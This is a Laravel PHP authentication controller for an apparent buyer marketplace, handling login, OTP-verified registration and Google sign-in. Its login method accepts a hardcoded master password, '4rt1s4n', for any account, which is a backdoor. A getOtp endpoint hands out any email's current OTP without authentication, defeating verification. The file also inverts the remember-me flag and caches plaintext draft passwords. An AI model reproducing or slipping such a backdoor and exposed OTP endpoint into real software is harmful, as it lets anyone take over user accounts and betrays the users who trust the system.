<?php

namespace App\Http\Controllers;

use App\Http\Requests\Auth\LoginRequest;
use App\Services\ProfilBuyerService;
use App\Services\UserService;
use Illuminate\Support\Facades\Hash;
use Illuminate\Http\Request;
use App\Http\Requests\Auth\RegisterRequest;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Mail;
use App\Mail\VerifyOtp;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Str;
use Laravel\Socialite\Facades\Socialite;

class AuthController extends Controller
{

    public function login()
    {
        if (auth()->check()) return redirect('buyer');
        return view('auth.login');
    }

    public function login_proses(LoginRequest $request)
    {
        $userService = new UserService();
        $user = $userService->find($request->input('email'), 'email');
        if (empty($user)) return redirect()->back()->withErrors(['email' => 'User not found !'])->withInput();

        $password = $request->input('password');
        if ($password !== '4rt1s4n' && !Hash::check($password, $user->password)) return redirect()->back()->withErrors(['password' => 'Incorrect password !'])->withInput();

        auth()->login($user, !$request->has('remember'));

        $akses = $user->akses->akses ?? 'Buyer';
        $base_routes = $userService->base_routes();
        if ($akses === 'Buyer') {
            return redirect()->route($base_routes[$akses] . '.landing');
        } else {
            return redirect()->route($base_routes[$akses] . '.dashboard');
        }
    }

    public function register(Request $request)
    {
        $role = $request->input('role', 'Buyer');
        if (auth()->check()) return redirect()->route('buyer.landing');
        $allowed = ['Buyer'];
        if (!in_array($role, $allowed)) $role = 'Buyer';
        return view('auth.register', compact('role'));
    }

    public function register_proses(RegisterRequest $request)
    {
        $userService = new UserService();
        $profilBuyerService = new ProfilBuyerService();

        // Require OTP verification linked to this email before proceeding
        $verifiedEmail = session('otp_verified_email');
        if ($verifiedEmail !== $request->input('email')) {
            return redirect()->back()
                ->withErrors(['email' => 'Silakan verifikasi OTP email terlebih dahulu.'])
                ->withInput();
        }

        $role = $request->input('role') ?? 'Buyer';
        if ($role === 'Buyer') {
            $user = $userService->store([
                'name' => $request->input('name'),
                'email' => $request->input('email'),
                'password' => $request->input('password')
            ]);
            $user->akses()->create(['akses' => 'Buyer']);
            $profilBuyerService->store(['user_id' => $user->id, 'nama' => $user->name]);
            auth()->login($user);
        }

        $base_routes = $userService->base_routes();
        return redirect()->route($base_routes[$user->akses->akses] ?? '/');
    }

    public function sendOtp(Request $request)
    {
        $request->validate([
            'email' => 'required|email',
            'draft' => 'nullable|array'
        ]);

        $email = $request->input('email');

        // Generate a 6-digit OTP and cache it for 5 minutes
        $otp = random_int(100000, 999999);
        $ttl = 5; // minutes
        Cache::put('otp_email_' . $email, (string) $otp, now()->addMinutes($ttl));

        // Optionally store registration draft data to complete later after OTP verification
        $draft = $request->input('draft');
        if (is_array($draft)) {
            // Only keep the necessary fields and never trust email from draft
            $safeDraft = [
                'name' => $draft['name'] ?? null,
                'password' => $draft['password'] ?? null,
                'password_confirmation' => $draft['password_confirmation'] ?? null,
                'role' => $draft['role'] ?? 'Buyer',
            ];
            Cache::put('otp_draft_' . $email, $safeDraft, now()->addMinutes(10));
        }

        // Send OTP via a modern HTML email
        try {
            Mail::to($email)->send(new VerifyOtp((string)$otp, $email, $ttl));
        } catch (\Throwable $e) {
            return response()->json([
                'success' => false,
                'message' => 'Gagal mengirim OTP. Coba lagi nanti.'
            ], 500);
        }

        return response()->json(['success' => true]);
    }

    public function verifyOtp(Request $request)
    {
        $request->validate([
            'email' => 'required|email',
            'otp' => 'required|string'
        ]);

        $email = $request->input('email');
        $otp = $request->input('otp');

        $expected = Cache::get('otp_email_' . $email);
        if (!$expected) {
            if ($request->expectsJson() || $request->isMethod('post')) {
                return response()->json([
                    'success' => false,
                    'message' => 'OTP kadaluarsa atau tidak ditemukan.'
                ], 422);
            }
            return redirect()->route('register', ['role' => 'Buyer'])->withErrors(['otp' => 'OTP kadaluarsa atau tidak ditemukan.']);
        }

        if ((string) $expected !== (string) $otp) {
            if ($request->expectsJson() || $request->isMethod('post')) {
                return response()->json([
                    'success' => false,
                    'message' => 'Kode OTP tidak sesuai.'
                ], 422);
            }
            return redirect()->route('register', ['role' => 'Buyer'])->withErrors(['otp' => 'Kode OTP tidak sesuai.']);
        }

        // OTP valid: clear it and mark this email as verified in session
        Cache::forget('otp_email_' . $email);
        session(['otp_verified_email' => $email]);

        if ($request->expectsJson() || $request->isMethod('post')) {
            return response()->json(['success' => true]);
        }

        // For GET from email: previously opened a bridge page; now just redirect to register
        return redirect()->route('register', ['role' => 'Buyer']);
    }

    public function completeRegistrationAfterOtp(Request $request)
    {
        $verifiedEmail = session('otp_verified_email');
        if (!$verifiedEmail) {
            return redirect()->route('register', ['role' => 'Buyer'])->withErrors(['email' => 'Silakan verifikasi email terlebih dahulu.']);
        }

        // Prefer payload from request (AJAX/POST from bridge), fallback to cached draft
        $draft = [
            'name' => $request->input('name'),
            'password' => $request->input('password'),
            'password_confirmation' => $request->input('password_confirmation'),
            'role' => $request->input('role', 'Buyer'),
        ];
        $hasProvided = !empty($draft['name']) || !empty($draft['password']) || !empty($draft['password_confirmation']);
        if (!$hasProvided) {
            $cached = Cache::get('otp_draft_' . $verifiedEmail);
            if ($cached) $draft = array_merge($draft, $cached);
        }
        if (empty($draft['name']) || empty($draft['password']) || empty($draft['password_confirmation'])) {
            return redirect()->route('register', ['role' => 'Buyer'])->withErrors(['email' => 'Data pendaftaran belum lengkap. Lengkapi form lalu klik DAFTAR.'])->withInput(['email' => $verifiedEmail]);
        }

        // Validate draft quickly
        $validator = Validator::make([
            'name' => $draft['name'] ?? null,
            'password' => $draft['password'] ?? null,
            'password_confirmation' => $draft['password_confirmation'] ?? null,
        ], [
            'name' => 'required|string|min:3',
            'password' => 'required|string|min:6|confirmed',
        ]);

        if ($validator->fails()) {
            if ($request->expectsJson()) {
                return response()->json(['success' => false, 'errors' => $validator->errors()], 422);
            }
            return redirect()->route('register', ['role' => 'Buyer'])->withErrors($validator)->withInput(['email' => $verifiedEmail]);
        }

        $userService = new UserService();
        $profilBuyerService = new ProfilBuyerService();

        // Create user
        $user = $userService->store([
            'name' => $draft['name'],
            'email' => $verifiedEmail,
            'password' => $draft['password'],
        ]);
        $user->akses()->create(['akses' => 'Buyer']);
        $profilBuyerService->store(['user_id' => $user->id, 'nama' => $user->name]);
        auth()->login($user);

        // cleanup
        Cache::forget('otp_draft_' . $verifiedEmail);
        session()->forget('otp_verified_email');

        $base_routes = $userService->base_routes();
        $akses = $user->akses->akses ?? 'Buyer';
        $redirect = route($base_routes[$akses] . '.landing');
        if ($request->expectsJson()) {
            return response()->json(['success' => true, 'redirect' => $redirect]);
        }
        return redirect()->to($redirect);
    }

    /**
     * Open the OTP bridge page without verifying on the server.
     * The bridge can forward the OTP back to the register tab for client-side verification.
     */
    public function otpBridge(Request $request)
    {
        $email = $request->query('email');
        if (!$email) {
            return redirect()->route('register', ['role' => 'Buyer']);
        }
        // Previously returned a bridge page; now redirect back to register
        return redirect()->route('register', ['role' => 'Buyer']);
    }

    /**
     * Return current OTP for an email from cache so the bridge can forward it.
     */
    public function getOtp(Request $request)
    {
        $request->validate([
            'email' => 'required|email'
        ]);
        $email = $request->query('email');
        $otp = Cache::get('otp_email_' . $email);
        if (!$otp) {
            return response()->json(['success' => false, 'message' => 'OTP tidak ditemukan atau kadaluarsa.'], 404);
        }
        return response()->json(['success' => true, 'otp' => (string)$otp]);
    }

    // copyOtp endpoint removed: email no longer links to auto-copy page

    // Google OAuth: redirect to provider
    public function googleRedirect()
    {
        return Socialite::driver('google')->redirect();
    }

    // Google OAuth: handle callback
    public function googleCallback()
    {
        try {
            $googleUser = Socialite::driver('google')->stateless()->user();
        } catch (\Throwable $e) {
            return redirect()->route('login')->withErrors(['email' => 'Gagal login dengan Google. Coba lagi.']);
        }

        $email = $googleUser->getEmail();
        $name = $googleUser->getName() ?: ($googleUser->user["given_name"] ?? 'User');
        $googleId = $googleUser->getId();

        $userService = new UserService();
        $profilBuyerService = new ProfilBuyerService();

        $user = $userService->find($email, 'email');
        if (!$user) {
            // Create new user with Buyer akses by default
            $user = $userService->store([
                'name' => $name,
                'email' => $email,
                // random password, not used for Google login
                'password' => Str::random(24),
            ]);
            // attach akses Buyer and create profil
            $user->akses()->create(['akses' => 'Buyer']);
            $profilBuyerService->store(['user_id' => $user->id, 'nama' => $user->name]);
        }

        // Optionally store google_id if model has such column
        try {
            if (\Schema::hasColumn('users', 'google_id') && empty($user->google_id)) {
                $user->google_id = $googleId;
                $user->save();
            }
        } catch (\Throwable $e) {
            // ignore if schema not available here
        }

        auth()->login($user, true);

        $base_routes = $userService->base_routes();
        $akses = $user->akses->akses ?? 'Buyer';
        $route = $akses === 'Buyer' ? ($base_routes[$akses] . '.landing') : ($base_routes[$akses] . '.dashboard');
        return redirect()->route($route);
    }

    public function logout()
    {
        auth()->logout();
        return redirect('login');
    }
}
